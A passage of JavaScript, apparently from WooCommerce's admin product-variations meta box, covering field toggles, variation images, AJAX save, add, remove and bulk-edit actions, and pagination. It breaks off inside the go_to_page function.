/* global wp, woocommerce_admin_meta_boxes_variations, woocommerce_admin, accounting */
jQuery( function ( $ ) {
	'use strict';

	/**
	 * Variations actions
	 */
	var wc_meta_boxes_product_variations_actions = {
		/**
		 * Initialize variations actions
		 */
		init: function () {
			$( '#variable_product_options' )
				.on(
					'change',
					'input.variable_is_downloadable',
					this.variable_is_downloadable
				)
				.on(
					'change',
					'input.variable_is_virtual',
					this.variable_is_virtual
				)
				.on(
					'change',
					'input.variable_manage_stock',
					this.variable_manage_stock
				)
				.on( 'click', 'button.notice-dismiss', this.notice_dismiss )
				.on( 'click', 'h3 .sort', this.set_menu_order )
				.on(
					'click',
					'button.add_price_for_variations',
					this.open_modal_to_set_variations_price
				)
				.on( 'reload', this.reload );

			$(
				'input.variable_is_downloadable, input.variable_is_virtual, input.variable_manage_stock'
			).trigger( 'change' );
			$( '#woocommerce-product-data' ).on(
				'woocommerce_variations_loaded',
				this.variations_loaded
			);
			$( document.body )
				.on( 'woocommerce_variations_added', this.variation_added )
				.on(
					'keyup',
					'.wc_input_variations_price',
					this.maybe_enable_button_to_add_price_to_variations
				);
		},

		/**
		 * Reload UI
		 *
		 * @param {Object} event
		 * @param {Int} qty
		 */
		reload: function () {
			wc_meta_boxes_product_variations_ajax.load_variations( 1 );
			wc_meta_boxes_product_variations_pagenav.set_paginav( 0 );
		},

		/**
		 * Check if variation is downloadable and show/hide elements
		 */
		variable_is_downloadable: function () {
			$( this )
				.closest( '.woocommerce_variation' )
				.find( '.show_if_variation_downloadable' )
				.hide();

			if ( $( this ).is( ':checked' ) ) {
				$( this )
					.closest( '.woocommerce_variation' )
					.find( '.show_if_variation_downloadable' )
					.show();
			}
		},

		/**
		 * Check if variation is virtual and show/hide elements
		 */
		variable_is_virtual: function () {
			$( this )
				.closest( '.woocommerce_variation' )
				.find( '.hide_if_variation_virtual' )
				.show();

			if ( $( this ).is( ':checked' ) ) {
				$( this )
					.closest( '.woocommerce_variation' )
					.find( '.hide_if_variation_virtual' )
					.hide();
			}
		},

		/**
		 * Maybe enable the button to add a price for every variation
		 */
		maybe_enable_button_to_add_price_to_variations: function () {
			var variation_price = parseInt(
				$( '.wc_input_variations_price' ).val(),
				10
			);
			if ( isNaN( variation_price ) ) {
				$( '.add_variations_price_button' ).prop( 'disabled', true );
			} else {
				$( '.add_variations_price_button' ).prop( 'disabled', false );
			}
		},

		/**
		 * Check if variation manage stock and show/hide elements
		 */
		variable_manage_stock: function () {
			$( this )
				.closest( '.woocommerce_variation' )
				.find( '.show_if_variation_manage_stock' )
				.hide();
			$( this )
				.closest( '.woocommerce_variation' )
				.find( '.variable_stock_status' )
				.show();

			if ( $( this ).is( ':checked' ) ) {
				$( this )
					.closest( '.woocommerce_variation' )
					.find( '.show_if_variation_manage_stock' )
					.show();
				$( this )
					.closest( '.woocommerce_variation' )
					.find( '.variable_stock_status' )
					.hide();
			}

			// Parent level.
			if ( $( 'input#_manage_stock:checked' ).length ) {
				$( this )
					.closest( '.woocommerce_variation' )
					.find( '.variable_stock_status' )
					.hide();
			}
		},

		/**
		 * Notice dismiss
		 */
		notice_dismiss: function () {
			$( this ).closest( 'div.notice' ).remove();
		},

		/**
		 * Run actions when variations is loaded
		 *
		 * @param {Object} event
		 * @param {Int} needsUpdate
		 */
		variations_loaded: function ( event, needsUpdate ) {
			needsUpdate = needsUpdate || false;

			var wrapper = $( '#woocommerce-product-data' );

			if ( ! needsUpdate ) {
				// Show/hide downloadable, virtual and stock fields
				$(
					'input.variable_is_downloadable, input.variable_is_virtual, input.variable_manage_stock',
					wrapper
				).trigger( 'change' );

				// Open sale schedule fields when have some sale price date
				$( '.woocommerce_variation', wrapper ).each( function (
					index,
					el
				) {
					var $el = $( el ),
						date_from = $( '.sale_price_dates_from', $el ).val(),
						date_to = $( '.sale_price_dates_to', $el ).val();

					if ( '' !== date_from || '' !== date_to ) {
						$( 'a.sale_schedule', $el ).trigger( 'click' );
					}
				} );

				// Remove variation-needs-update classes
				$(
					'.woocommerce_variations .variation-needs-update',
					wrapper
				).removeClass( 'variation-needs-update' );

				// Disable cancel and save buttons
				$(
					'button.cancel-variation-changes, button.save-variation-changes',
					wrapper
				).attr( 'disabled', 'disabled' );
			}

			// Init TipTip
			$( '#tiptip_holder' ).removeAttr( 'style' );
			$( '#tiptip_arrow' ).removeAttr( 'style' );
			$(
				'.woocommerce_variations .tips, ' +
					'.woocommerce_variations .help_tip, ' +
					'.woocommerce_variations .woocommerce-help-tip, ' +
					'.toolbar-variations-defaults .woocommerce-help-tip',
				wrapper
			).tipTip( {
				attribute: 'data-tip',
				fadeIn: 50,
				fadeOut: 50,
				delay: 200,
			} );

			// Datepicker fields
			$( '.sale_price_dates_fields', wrapper )
				.find( 'input' )
				.datepicker( {
					defaultDate: '',
					dateFormat: 'yy-mm-dd',
					numberOfMonths: 1,
					showButtonPanel: true,
					onSelect: function () {
						var option = $( this ).is( '.sale_price_dates_from' )
								? 'minDate'
								: 'maxDate',
							dates = $( this )
								.closest( '.sale_price_dates_fields' )
								.find( 'input' ),
							date = $( this ).datepicker( 'getDate' );

						dates.not( this ).datepicker( 'option', option, date );
						$( this ).trigger( 'change' );
					},
				} );

			// Allow sorting
			$( '.woocommerce_variations', wrapper ).sortable( {
				items: '.woocommerce_variation',
				cursor: 'move',
				axis: 'y',
				handle: '.sort',
				scrollSensitivity: 40,
				forcePlaceholderSize: true,
				helper: 'clone',
				opacity: 0.65,
				stop: function () {
					wc_meta_boxes_product_variations_actions.variation_row_indexes();
				},
			} );

			$( document.body ).trigger( 'wc-enhanced-select-init' );
		},

		/**
		 * Run actions when added a variation
		 *
		 * @param {Object} event
		 * @param {Int} qty
		 */
		variation_added: function ( event, qty ) {
			if ( 1 === qty ) {
				wc_meta_boxes_product_variations_actions.variations_loaded(
					null,
					true
				);
			}
		},

		/**
		 * Sets a price for every variation
		 */
		set_variations_price: function () {
			var variation_price = $( '.wc_input_variations_price' ).val();
			var product_type = $( 'select#product-type' ).val();
			var input_type =
				'variable-subscription' === product_type
					? 'variable_subscription_sign_up_fee'
					: 'variable_regular_price';
			var input = $( `.wc_input_price[name^=${ input_type }]` );

			// We don't want to override prices already set
			input.each( function ( index, el ) {
				if ( '0' === $( el ).val() || '' === $( el ).val() ) {
					$( el ).val( variation_price ).trigger( 'change' );
				}
			} );
			wc_meta_boxes_product_variations_ajax.save_variations();
		},

		/**
		 * Opens the modal to set a price for every variation
		 */
		open_modal_to_set_variations_price: function () {
			$( this ).WCBackboneModal( {
				template: 'wc-modal-set-price-variations',
			} );
			$( '.add_variations_price_button' ).on(
				'click',
				wc_meta_boxes_product_variations_actions.set_variations_price
			);
		},

		/**
		 * Lets the user manually input menu order to move items around pages
		 */
		set_menu_order: function ( event ) {
			event.preventDefault();
			var $menu_order = $( this )
				.closest( '.woocommerce_variation' )
				.find( '.variation_menu_order' );
			var variation_id = $( this )
				.closest( '.woocommerce_variation' )
				.find( '.variable_post_id' )
				.val();
			var value = window.prompt(
				woocommerce_admin_meta_boxes_variations.i18n_enter_menu_order,
				$menu_order.val()
			);

			if ( value != null ) {
				// Set value, save changes and reload view
				$menu_order.val( parseInt( value, 10 ) ).trigger( 'change' );

				$( this )
					.closest( '.woocommerce_variation' )
					.append(
						'<input type="hidden" name="new_variation_menu_order_id" value="' +
							encodeURIComponent( variation_id ) +
							'" />'
					);

				$( this )
					.closest( '.woocommerce_variation' )
					.append(
						'<input type="hidden" name="new_variation_menu_order_value" value="' +
							encodeURIComponent( parseInt( value, 10 ) ) +
							'" />'
					);

				wc_meta_boxes_product_variations_ajax.save_variations();
			}
		},

		/**
		 * Set menu order
		 */
		variation_row_indexes: function () {
			var wrapper = $( '#variable_product_options' ).find(
					'.woocommerce_variations'
				),
				current_page = parseInt( wrapper.attr( 'data-page' ), 10 ),
				offset = parseInt(
					( current_page - 1 ) *
						woocommerce_admin_meta_boxes_variations.variations_per_page,
					10
				);

			$( '.woocommerce_variations .woocommerce_variation' ).each(
				function ( index, el ) {
					$( '.variation_menu_order', el )
						.val(
							parseInt(
								$( el ).index(
									'.woocommerce_variations .woocommerce_variation'
								),
								10
							) +
								1 +
								offset
						)
						.trigger( 'change' );
				}
			);
		},
	};

	/**
	 * Variations media actions
	 */
	var wc_meta_boxes_product_variations_media = {
		/**
		 * wp.media frame object
		 *
		 * @type {Object}
		 */
		variable_image_frame: null,

		/**
		 * Variation image ID
		 *
		 * @type {Int}
		 */
		setting_variation_image_id: null,

		/**
		 * Variation image object
		 *
		 * @type {Object}
		 */
		setting_variation_image: null,

		/**
		 * wp.media post ID
		 *
		 * @type {Int}
		 */
		wp_media_post_id: wp.media.model.settings.post.id,

		/**
		 * Initialize media actions
		 */
		init: function () {
			$( '#variable_product_options' ).on(
				'click',
				'.upload_image_button',
				this.add_image
			);
			$( 'a.add_media' ).on( 'click', this.restore_wp_media_post_id );
		},

		/**
		 * Added new image
		 *
		 * @param {Object} event
		 */
		add_image: function ( event ) {
			var $button = $( this ),
				post_id = $button.attr( 'rel' ),
				$parent = $button.closest( '.upload_image' );

			wc_meta_boxes_product_variations_media.setting_variation_image = $parent;
			wc_meta_boxes_product_variations_media.setting_variation_image_id = post_id;

			event.preventDefault();

			if ( $button.is( '.remove' ) ) {
				$(
					'.upload_image_id',
					wc_meta_boxes_product_variations_media.setting_variation_image
				)
					.val( '' )
					.trigger( 'change' );
				wc_meta_boxes_product_variations_media.setting_variation_image
					.find( 'img' )
					.eq( 0 )
					.attr(
						'src',
						woocommerce_admin_meta_boxes_variations.woocommerce_placeholder_img_src
					);
				wc_meta_boxes_product_variations_media.setting_variation_image
					.find( '.upload_image_button' )
					.removeClass( 'remove' );
			} else {
				// If the media frame already exists, reopen it.
				if (
					wc_meta_boxes_product_variations_media.variable_image_frame
				) {
					wc_meta_boxes_product_variations_media.variable_image_frame.uploader.uploader.param(
						'post_id',
						wc_meta_boxes_product_variations_media.setting_variation_image_id
					);
					wc_meta_boxes_product_variations_media.variable_image_frame.open();
					return;
				} else {
					wp.media.model.settings.post.id =
						wc_meta_boxes_product_variations_media.setting_variation_image_id;
				}

				// Create the media frame.
				wc_meta_boxes_product_variations_media.variable_image_frame = wp.media.frames.variable_image = wp.media(
					{
						// Set the title of the modal.
						title:
							woocommerce_admin_meta_boxes_variations.i18n_choose_image,
						button: {
							text:
								woocommerce_admin_meta_boxes_variations.i18n_set_image,
						},
						states: [
							new wp.media.controller.Library( {
								title:
									woocommerce_admin_meta_boxes_variations.i18n_choose_image,
								filterable: 'all',
							} ),
						],
					}
				);

				// When an image is selected, run a callback.
				wc_meta_boxes_product_variations_media.variable_image_frame.on(
					'select',
					function () {
						var attachment = wc_meta_boxes_product_variations_media.variable_image_frame
								.state()
								.get( 'selection' )
								.first()
								.toJSON(),
							url =
								attachment.sizes && attachment.sizes.thumbnail
									? attachment.sizes.thumbnail.url
									: attachment.url;

						$(
							'.upload_image_id',
							wc_meta_boxes_product_variations_media.setting_variation_image
						)
							.val( attachment.id )
							.trigger( 'change' );
						wc_meta_boxes_product_variations_media.setting_variation_image
							.find( '.upload_image_button' )
							.addClass( 'remove' );
						wc_meta_boxes_product_variations_media.setting_variation_image
							.find( 'img' )
							.eq( 0 )
							.attr( 'src', url );

						wp.media.model.settings.post.id =
							wc_meta_boxes_product_variations_media.wp_media_post_id;
					}
				);

				// Finally, open the modal.
				wc_meta_boxes_product_variations_media.variable_image_frame.open();
			}
		},

		/**
		 * Restore wp.media post ID.
		 */
		restore_wp_media_post_id: function () {
			wp.media.model.settings.post.id =
				wc_meta_boxes_product_variations_media.wp_media_post_id;
		},
	};

	/**
	 * Product variations metabox ajax methods
	 */
	var wc_meta_boxes_product_variations_ajax = {
		/**
		 * Initialize variations ajax methods
		 */
		init: function () {
			$( 'li.variations_tab a' ).on( 'click', this.initial_load );

			$( '#variable_product_options' )
				.on(
					'click',
					'button.save-variation-changes',
					this.save_variations
				)
				.on(
					'click',
					'button.cancel-variation-changes',
					this.cancel_variations
				)
				.on( 'click', '.remove_variation', this.remove_variation )
				.on(
					'click',
					'.downloadable_files a.delete',
					this.input_changed
				);

			$( document.body )
				.on(
					'change input',
					'#variable_product_options .woocommerce_variations :input',
					this.input_changed
				)
				.on(
					'change',
					'.variations-defaults select',
					this.defaults_changed
				);

			var postForm = $( 'form#post' );

			postForm.on( 'submit', this.save_on_submit );

			$( 'input:submit', postForm ).on( 'click keypress', function () {
				postForm.data( 'callerid', this.id );
			} );

			$( '.wc-metaboxes-wrapper' ).on(
				'click',
				'a.do_variation_action',
				this.do_variation_action
			);
		},

		/**
		 * Check if have some changes before leave the page
		 *
		 * @return {Bool}
		 */
		check_for_changes: function () {
			var need_update = $( '#variable_product_options' ).find(
				'.woocommerce_variations .variation-needs-update'
			);

			if ( 0 < need_update.length ) {
				if (
					window.confirm(
						woocommerce_admin_meta_boxes_variations.i18n_edited_variations
					)
				) {
					wc_meta_boxes_product_variations_ajax.save_changes();
				} else {
					need_update.removeClass( 'variation-needs-update' );
					return false;
				}
			}

			return true;
		},

		/**
		 * Block edit screen
		 */
		block: function () {
			$( '#woocommerce-product-data' ).block( {
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6,
				},
			} );
		},

		/**
		 * Unblock edit screen
		 */
		unblock: function () {
			$( '#woocommerce-product-data' ).unblock();
		},

		/**
		 * Initial load variations
		 *
		 * @return {Bool}
		 */
		initial_load: function () {
			if (
				0 ===
				$( '#variable_product_options' ).find(
					'.woocommerce_variations .woocommerce_variation'
				).length
			) {
				wc_meta_boxes_product_variations_pagenav.go_to_page();
			}
		},

		/**
		 * Load variations via Ajax
		 *
		 * @param {Int} page (default: 1)
		 * @param {Int} per_page (default: 10)
		 */
		load_variations: function ( page, per_page ) {
			page = page || 1;
			per_page =
				per_page ||
				woocommerce_admin_meta_boxes_variations.variations_per_page;

			var wrapper = $( '#variable_product_options' ).find(
				'.woocommerce_variations'
			);

			wc_meta_boxes_product_variations_ajax.block();

			$.ajax( {
				url: woocommerce_admin_meta_boxes_variations.ajax_url,
				data: {
					action: 'woocommerce_load_variations',
					security:
						woocommerce_admin_meta_boxes_variations.load_variations_nonce,
					product_id: woocommerce_admin_meta_boxes_variations.post_id,
					attributes: wrapper.data( 'attributes' ),
					page: page,
					per_page: per_page,
				},
				type: 'POST',
				success: function ( response ) {
					wrapper
						.empty()
						.append( response )
						.attr( 'data-page', page );

					$( '#woocommerce-product-data' ).trigger(
						'woocommerce_variations_loaded'
					);

					wc_meta_boxes_product_variations_ajax.unblock();
				},
			} );
		},

		/**
		 * Ger variations fields and convert to object
		 *
		 * @param  {Object} fields
		 *
		 * @return {Object}
		 */
		get_variations_fields: function ( fields ) {
			var data = $( ':input', fields ).serializeJSON();

			$( '.variations-defaults select' ).each( function (
				index,
				element
			) {
				var select = $( element );
				data[ select.attr( 'name' ) ] = select.val();
			} );

			return data;
		},

		/**
		 * Save variations changes
		 *
		 * @param {Function} callback Called once saving is complete
		 */
		save_changes: function ( callback ) {
			var wrapper = $( '#variable_product_options' ).find(
					'.woocommerce_variations'
				),
				need_update = $( '.variation-needs-update', wrapper ),
				data = {};

			// Save only with products need update.
			if ( 0 < need_update.length ) {
				wc_meta_boxes_product_variations_ajax.block();

				data = wc_meta_boxes_product_variations_ajax.get_variations_fields(
					need_update
				);
				data.action = 'woocommerce_save_variations';
				data.security =
					woocommerce_admin_meta_boxes_variations.save_variations_nonce;
				data.product_id =
					woocommerce_admin_meta_boxes_variations.post_id;
				data[ 'product-type' ] = $( '#product-type' ).val();

				$.ajax( {
					url: woocommerce_admin_meta_boxes_variations.ajax_url,
					data: data,
					type: 'POST',
					success: function ( response ) {
						// Allow change page, delete and add new variations
						need_update.removeClass( 'variation-needs-update' );
						$(
							'button.cancel-variation-changes, button.save-variation-changes'
						).attr( 'disabled', 'disabled' );

						$( '#woocommerce-product-data' ).trigger(
							'woocommerce_variations_saved'
						);

						if ( typeof callback === 'function' ) {
							callback( response );
						}

						wc_meta_boxes_product_variations_ajax.unblock();
					},
				} );
			}
		},

		/**
		 * Save variations
		 *
		 * @return {Bool}
		 */
		save_variations: function () {
			$( '#variable_product_options' ).trigger(
				'woocommerce_variations_save_variations_button'
			);

			wc_meta_boxes_product_variations_ajax.save_changes( function (
				error
			) {
				var wrapper = $( '#variable_product_options' ).find(
						'.woocommerce_variations'
					),
					current = wrapper.attr( 'data-page' );

				$( '#variable_product_options' )
					.find( '#woocommerce_errors' )
					.remove();

				if ( error ) {
					wrapper.before( error );
				}

				$( '.variations-defaults select' ).each( function () {
					$( this ).attr( 'data-current', $( this ).val() );
				} );

				wc_meta_boxes_product_variations_pagenav.go_to_page( current );
			} );

			return false;
		},

		/**
		 * Save on post form submit
		 */
		save_on_submit: function ( e ) {
			var need_update = $( '#variable_product_options' ).find(
				'.woocommerce_variations .variation-needs-update'
			);

			if ( 0 < need_update.length ) {
				e.preventDefault();
				$( '#variable_product_options' ).trigger(
					'woocommerce_variations_save_variations_on_submit'
				);
				wc_meta_boxes_product_variations_ajax.save_changes(
					wc_meta_boxes_product_variations_ajax.save_on_submit_done
				);
			}
		},

		/**
		 * After saved, continue with form submission
		 */
		save_on_submit_done: function () {
			var postForm = $( 'form#post' ),
				callerid = postForm.data( 'callerid' );

			if ( 'publish' === callerid ) {
				postForm
					.append(
						'<input type="hidden" name="publish" value="1" />'
					)
					.trigger( 'submit' );
			} else {
				postForm
					.append(
						'<input type="hidden" name="save-post" value="1" />'
					)
					.trigger( 'submit' );
			}
		},

		/**
		 * Discart changes.
		 *
		 * @return {Bool}
		 */
		cancel_variations: function () {
			var current = parseInt(
				$( '#variable_product_options' )
					.find( '.woocommerce_variations' )
					.attr( 'data-page' ),
				10
			);

			$( '#variable_product_options' )
				.find( '.woocommerce_variations .variation-needs-update' )
				.removeClass( 'variation-needs-update' );
			$( '.variations-defaults select' ).each( function () {
				$( this ).val( $( this ).attr( 'data-current' ) );
			} );

			wc_meta_boxes_product_variations_pagenav.go_to_page( current );

			return false;
		},

		/**
		 * Add variation
		 *
		 * @return {Bool}
		 */
		add_variation: function () {
			wc_meta_boxes_product_variations_ajax.block();

			var data = {
				action: 'woocommerce_add_variation',
				post_id: woocommerce_admin_meta_boxes_variations.post_id,
				loop: $( '.woocommerce_variation' ).length,
				security:
					woocommerce_admin_meta_boxes_variations.add_variation_nonce,
			};

			$.post(
				woocommerce_admin_meta_boxes_variations.ajax_url,
				data,
				function ( response ) {
					var variation = $( response );
					variation.addClass( 'variation-needs-update' );

					$( '.woocommerce-notice-invalid-variation' ).remove();
					$( '#variable_product_options' )
						.find( '.woocommerce_variations' )
						.prepend( variation );
					$(
						'button.cancel-variation-changes, button.save-variation-changes'
					).prop( 'disabled', false );
					$( '#variable_product_options' ).trigger(
						'woocommerce_variations_added',
						1
					);
					wc_meta_boxes_product_variations_ajax.unblock();
				}
			);

			return false;
		},

		/**
		 * Remove variation
		 *
		 * @return {Bool}
		 */
		remove_variation: function () {
			wc_meta_boxes_product_variations_ajax.check_for_changes();

			if (
				window.confirm(
					woocommerce_admin_meta_boxes_variations.i18n_remove_variation
				)
			) {
				var variation = $( this ).attr( 'rel' ),
					variation_ids = [],
					data = {
						action: 'woocommerce_remove_variations',
					};

				wc_meta_boxes_product_variations_ajax.block();

				if ( 0 < variation ) {
					variation_ids.push( variation );

					data.variation_ids = variation_ids;
					data.security =
						woocommerce_admin_meta_boxes_variations.delete_variations_nonce;

					$.post(
						woocommerce_admin_meta_boxes_variations.ajax_url,
						data,
						function () {
							var wrapper = $( '#variable_product_options' ).find(
									'.woocommerce_variations'
								),
								current_page = parseInt(
									wrapper.attr( 'data-page' ),
									10
								),
								total_pages = Math.ceil(
									( parseInt(
										wrapper.attr( 'data-total' ),
										10
									) -
										1 ) /
										woocommerce_admin_meta_boxes_variations.variations_per_page
								),
								page = 1;

							$( '#woocommerce-product-data' ).trigger(
								'woocommerce_variations_removed'
							);

							if (
								current_page === total_pages ||
								current_page <= total_pages
							) {
								page = current_page;
							} else if (
								current_page > total_pages &&
								0 !== total_pages
							) {
								page = total_pages;
							}

							wc_meta_boxes_product_variations_pagenav.go_to_page(
								page,
								-1
							);
						}
					);
				} else {
					wc_meta_boxes_product_variations_ajax.unblock();
				}
			}

			return false;
		},

		/**
		 * Link all variations (or at least try :p)
		 *
		 * @return {Bool}
		 */
		link_all_variations: function () {
			wc_meta_boxes_product_variations_ajax.check_for_changes();

			if (
				window.confirm(
					woocommerce_admin_meta_boxes_variations.i18n_link_all_variations
				)
			) {
				wc_meta_boxes_product_variations_ajax.block();

				var data = {
					action: 'woocommerce_link_all_variations',
					post_id: woocommerce_admin_meta_boxes_variations.post_id,
					security:
						woocommerce_admin_meta_boxes_variations.link_variation_nonce,
				};

				$.post(
					woocommerce_admin_meta_boxes_variations.ajax_url,
					data,
					function ( response ) {
						var count = parseInt( response, 10 );

						if ( 1 === count ) {
							window.alert(
								count +
									' ' +
									woocommerce_admin_meta_boxes_variations.i18n_variation_added
							);
						} else if ( 0 === count || count > 1 ) {
							window.alert(
								count +
									' ' +
									woocommerce_admin_meta_boxes_variations.i18n_variations_added
							);
						} else {
							window.alert(
								woocommerce_admin_meta_boxes_variations.i18n_no_variations_added
							);
						}

						if ( count > 0 ) {
							wc_meta_boxes_product_variations_pagenav.go_to_page(
								1,
								count
							);
							$( '#variable_product_options' ).trigger(
								'woocommerce_variations_added',
								count
							);
						} else {
							wc_meta_boxes_product_variations_ajax.unblock();
						}
					}
				);
			}

			return false;
		},

		/**
		 * Add new class when have changes in some input
		 */
		input_changed: function ( event ) {
			$( this )
				.closest( '.woocommerce_variation' )
				.addClass( 'variation-needs-update' );

			$(
				'button.cancel-variation-changes, button.save-variation-changes'
			).prop( 'disabled', false );

			// Do not trigger 'woocommerce_variations_input_changed' for 'input' events for backwards compat.
			if ( 'input' === event.type && $( this ).is( ':text' ) ) {
				return;
			}

			$( '#variable_product_options' ).trigger(
				'woocommerce_variations_input_changed'
			);
		},

		/**
		 * Added new .variation-needs-update class when defaults is changed
		 */
		defaults_changed: function () {
			$( this )
				.closest( '#variable_product_options' )
				.find( '.woocommerce_variation:first' )
				.addClass( 'variation-needs-update' );

			$(
				'button.cancel-variation-changes, button.save-variation-changes'
			).prop( 'disabled', false );

			$( '#variable_product_options' ).trigger(
				'woocommerce_variations_defaults_changed'
			);
		},

		/**
		 * Actions
		 */
		do_variation_action: function () {
			var do_variation_action = $( 'select.variation_actions' ).val(),
				data = {},
				changes = 0,
				value;

			switch ( do_variation_action ) {
				case 'add_variation':
					wc_meta_boxes_product_variations_ajax.add_variation();
					return;
				case 'link_all_variations':
					wc_meta_boxes_product_variations_ajax.link_all_variations();
					return;
				case 'delete_all':
					if (
						window.confirm(
							woocommerce_admin_meta_boxes_variations.i18n_delete_all_variations
						)
					) {
						if (
							window.confirm(
								woocommerce_admin_meta_boxes_variations.i18n_last_warning
							)
						) {
							data.allowed = true;
							changes =
								parseInt(
									$( '#variable_product_options' )
										.find( '.woocommerce_variations' )
										.attr( 'data-total' ),
									10
								) * -1;
						}
					}
					break;
				case 'variable_regular_price_increase':
				case 'variable_regular_price_decrease':
				case 'variable_sale_price_increase':
				case 'variable_sale_price_decrease':
					value = window.prompt(
						woocommerce_admin_meta_boxes_variations.i18n_enter_a_value_fixed_or_percent
					);

					if ( value != null ) {
						if ( value.indexOf( '%' ) >= 0 ) {
							data.value =
								accounting.unformat(
									value.replace( /\%/, '' ),
									woocommerce_admin.mon_decimal_point
								) + '%';
						} else {
							data.value = accounting.unformat(
								value,
								woocommerce_admin.mon_decimal_point
							);
						}
					} else {
						return;
					}
					break;
				case 'variable_regular_price':
				case 'variable_sale_price':
				case 'variable_stock':
				case 'variable_low_stock_amount':
				case 'variable_weight':
				case 'variable_length':
				case 'variable_width':
				case 'variable_height':
				case 'variable_download_limit':
				case 'variable_download_expiry':
					value = window.prompt(
						woocommerce_admin_meta_boxes_variations.i18n_enter_a_value
					);

					if ( value != null ) {
						data.value = value;
					} else {
						return;
					}
					break;
				case 'variable_sale_schedule':
					data.date_from = window.prompt(
						woocommerce_admin_meta_boxes_variations.i18n_scheduled_sale_start
					);
					data.date_to = window.prompt(
						woocommerce_admin_meta_boxes_variations.i18n_scheduled_sale_end
					);

					if ( null === data.date_from ) {
						data.date_from = false;
					}

					if ( null === data.date_to ) {
						data.date_to = false;
					}

					if ( false === data.date_to && false === data.date_from ) {
						return;
					}
					break;
				default:
					$( 'select.variation_actions' ).trigger(
						do_variation_action
					);
					data = $( 'select.variation_actions' ).triggerHandler(
						do_variation_action + '_ajax_data',
						data
					);

					if ( null === data ) {
						return;
					}
					break;
			}

			if ( 'delete_all' === do_variation_action && data.allowed ) {
				$( '#variable_product_options' )
					.find( '.variation-needs-update' )
					.removeClass( 'variation-needs-update' );
			} else {
				wc_meta_boxes_product_variations_ajax.check_for_changes();
			}

			wc_meta_boxes_product_variations_ajax.block();

			$.ajax( {
				url: woocommerce_admin_meta_boxes_variations.ajax_url,
				data: {
					action: 'woocommerce_bulk_edit_variations',
					security:
						woocommerce_admin_meta_boxes_variations.bulk_edit_variations_nonce,
					product_id: woocommerce_admin_meta_boxes_variations.post_id,
					product_type: $( '#product-type' ).val(),
					bulk_action: do_variation_action,
					data: data,
				},
				type: 'POST',
				success: function () {
					wc_meta_boxes_product_variations_pagenav.go_to_page(
						1,
						changes
					);
				},
			} );
		},
	};

	/**
	 * Product variations pagenav
	 */
	var wc_meta_boxes_product_variations_pagenav = {
		/**
		 * Initialize products variations meta box
		 */
		init: function () {
			$( document.body )
				.on(
					'woocommerce_variations_added',
					this.update_single_quantity
				)
				.on(
					'change',
					'.variations-pagenav .page-selector',
					this.page_selector
				)
				.on(
					'click',
					'.variations-pagenav .first-page',
					this.first_page
				)
				.on( 'click', '.variations-pagenav .prev-page', this.prev_page )
				.on( 'click', '.variations-pagenav .next-page', this.next_page )
				.on(
					'click',
					'.variations-pagenav .last-page',
					this.last_page
				);
		},

		/**
		 * Set variations count
		 *
		 * @param {Int} qty
		 *
		 * @return {Int}
		 */
		update_variations_count: function ( qty ) {
			var wrapper = $( '#variable_product_options' ).find(
					'.woocommerce_variations'
				),
				total = parseInt( wrapper.attr( 'data-total' ), 10 ) + qty,
				displaying_num = $( '.variations-pagenav .displaying-num' );

			// Set the new total of variations
			wrapper.attr( 'data-total', total );

			if ( 1 === total ) {
				displaying_num.text(
					woocommerce_admin_meta_boxes_variations.i18n_variation_count_single.replace(
						'%qty%',
						total
					)
				);
			} else {
				displaying_num.text(
					woocommerce_admin_meta_boxes_variations.i18n_variation_count_plural.replace(
						'%qty%',
						total
					)
				);
			}

			return total;
		},

		/**
		 * Update variations quantity when add a new variation
		 *
		 * @param {Object} event
		 * @param {Int} qty
		 */
		update_single_quantity: function ( event, qty ) {
			if ( 1 === qty ) {
				var page_nav = $( '.variations-pagenav' );

				wc_meta_boxes_product_variations_pagenav.update_variations_count(
					qty
				);

				if ( page_nav.is( ':hidden' ) ) {
					$( 'option, optgroup', '.variation_actions' ).show();
					$( '.variation_actions' ).val( 'add_variation' );
					$( '#variable_product_options' ).find( '.toolbar' ).show();
					page_nav.show();
					$( '.pagination-links', page_nav ).hide();
				}
			}
		},

		/**
		 * Set the pagenav fields
		 *
		 * @param {Int} qty
		 */
		set_paginav: function ( qty ) {
			var wrapper = $( '#variable_product_options' ).find(
					'.woocommerce_variations'
				),
				new_qty = wc_meta_boxes_product_variations_pagenav.update_variations_count(
					qty
				),
				toolbar = $( '#variable_product_options' ).find( '.toolbar' ),
				variation_action = $( '.variation_actions' ),
				page_nav = $( '.variations-pagenav' ),
				displaying_links = $( '.pagination-links', page_nav ),
				total_pages = Math.ceil(
					new_qty /
						woocommerce_admin_meta_boxes_variations.variations_per_page
				),
				options = '';

			// Set the new total of pages
			wrapper.attr( 'data-total_pages', total_pages );

			$( '.total-pages', page_nav ).text( total_pages );

			// Set the new pagenav options
			for ( var i = 1; i <= total_pages; i++ ) {
				options += '<option value="' + i + '">' + i + '</option>';
			}

			$( '.page-selector', page_nav ).empty().html( options );

			// Show/hide pagenav
			if ( 0 === new_qty ) {
				toolbar.not( '.toolbar-top, .toolbar-buttons' ).hide();
				page_nav.hide();
				$( 'option, optgroup', variation_action ).hide();
				$( '.variation_actions' ).val( 'add_variation' );
				$( 'option[data-global="true"]', variation_action ).show();
			} else {
				toolbar.show();
				page_nav.show();
				$( 'option, optgroup', variation_action ).show();
				$( '.variation_actions' ).val( 'add_variation' );

				// Show/hide links
				if ( 1 === total_pages ) {
					displaying_links.hide();
				} else {
					displaying_links.show();
				}
			}
		},

		/**
		 * Check button if enabled and if don't have changes
		 *
		 * @return {Bool}
		 */
		check_is_enabled: function ( current ) {
			return ! $( current ).hasClass( 'disabled' );
		},

		/**
		 * Change "disabled" class on pagenav
		 */
		change_classes: function ( selected, total ) {
			var first_page = $( '.variations-pagenav .first-page' ),
				prev_page = $( '.variations-pagenav .prev-page' ),
				next_page = $( '.variations-pagenav .next-page' ),
				last_page = $( '.variations-pagenav .last-page' );

			if ( 1 === selected ) {
				first_page.addClass( 'disabled' );
				prev_page.addClass( 'disabled' );
			} else {
				first_page.removeClass( 'disabled' );
				prev_page.removeClass( 'disabled' );
			}

			if ( total === selected ) {
				next_page.addClass( 'disabled' );
				last_page.addClass( 'disabled' );
			} else {
				next_page.removeClass( 'disabled' );
				last_page.removeClass( 'disabled' );
			}
		},

		/**
		 * Set page
		 */
		set_page: function ( page ) {
			$( '.variations-pagenav .page-selector' )
				.val( page )
				.first()
				.trigger( 'change' );
		},

		/**
		 * Navigate on variations pages
		 *
		 * @param {Int} page
		 * @param {Int} qty
		 */
		go_to_page: function ( page, qty ) {
